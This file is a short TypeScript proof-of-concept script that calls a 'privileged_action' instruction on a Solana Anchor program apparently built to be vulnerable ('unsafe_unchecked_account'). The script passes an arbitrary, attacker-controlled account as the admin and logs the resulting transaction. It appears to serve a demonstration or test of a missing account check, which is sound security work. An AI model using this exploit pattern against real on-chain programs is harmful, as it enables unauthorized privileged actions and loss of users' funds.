import * as anchor from "@coral-xyz/anchor";
import fs from "fs";
import path from "path";
import { PublicKey, Keypair, Transaction, TransactionInstruction } from "@solana/web3.js";

async function main() {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const programId = new PublicKey("QB7FhB7nRdL18x8teKV5LsiYCP8YnduXZUVye4kfoWr");

  // Load discriminator from generated IDL
  const idlPath = path.join(__dirname, "../target/idl/unsafe_unchecked_account.json");
  const idl = JSON.parse(fs.readFileSync(idlPath, "utf8"));
  const disc: number[] = idl.instructions.find((i: any) => i.name === "privileged_action").discriminator;

  const arbitraryAdmin = Keypair.generate().publicKey; // attacker-controlled unchecked account

  const ix = new TransactionInstruction({
    programId,
    keys: [
      { pubkey: arbitraryAdmin, isSigner: false, isWritable: false },
    ],
    data: Buffer.from(disc),
  });

  const tx = new Transaction().add(ix);
  const sig = await provider.sendAndConfirm(tx, []);
  try {
    const txMeta = await provider.connection.getTransaction(sig, { commitment: "confirmed", maxSupportedTransactionVersion: 0 } as any);
    if (txMeta?.meta?.logMessages) {
      console.log("LOGS_START");
      for (const line of txMeta.meta.logMessages) console.log(line);
      console.log("LOGS_END");
    }
  } catch {}

  console.log("POC_TX:", sig);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
